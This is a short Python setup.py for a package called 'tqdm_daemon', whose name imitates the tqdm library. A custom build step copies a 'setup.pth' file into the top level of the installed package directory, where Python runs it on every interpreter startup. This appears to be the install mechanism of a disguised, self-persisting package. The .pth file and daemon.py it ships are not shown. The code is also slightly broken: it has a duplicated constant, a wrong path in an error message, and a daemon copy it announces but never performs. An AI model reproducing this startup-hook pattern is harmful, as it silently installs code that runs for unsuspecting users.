import os
from setuptools import setup, find_packages
from setuptools.command.build_py import build_py

PTH_FILE_NAME = "setup.pth"
PTH_FILE_NAME = "setup.pth"
INSERT_FILE_NAME = "daemon.py"
PACKAGE_NAME = "tqdm_daemon"


class selfBuild(build_py):
    def run(self):
        super().run()
        package_dir = self.get_package_dir(PACKAGE_NAME)
        pth_source = os.path.join(package_dir, PTH_FILE_NAME)
        if not os.path.isfile(pth_source):
            raise FileNotFoundError(f"The .pth file was not found at the expected location: {pth_source}")
        pth_target = os.path.join(self.build_lib, PTH_FILE_NAME)
        print(f"\n[CUSTOM BUILD] Copying {pth_source} to {pth_target}")
        daemon_source = os.path.join(package_dir, INSERT_FILE_NAME)
        if not os.path.isfile(daemon_source):
            raise FileNotFoundError(f"The .py file was not found at the expected location: {pth_source}")
        daemon_target = os.path.join(self.build_lib, INSERT_FILE_NAME)
        print(f"\n[CUSTOM BUILD] Copying {daemon_source} to {daemon_target}")
        self.copy_file(pth_source, pth_target, preserve_mode=0)


setup(
    name="tqdm_daemon",
    version="0.2.8",
    description="A daemon program for tqdm utils.",
    packages=find_packages(),
    package_data={PACKAGE_NAME: [PTH_FILE_NAME, INSERT_FILE_NAME]},
    include_package_data=True,
    cmdclass={"build_py": selfBuild},
)
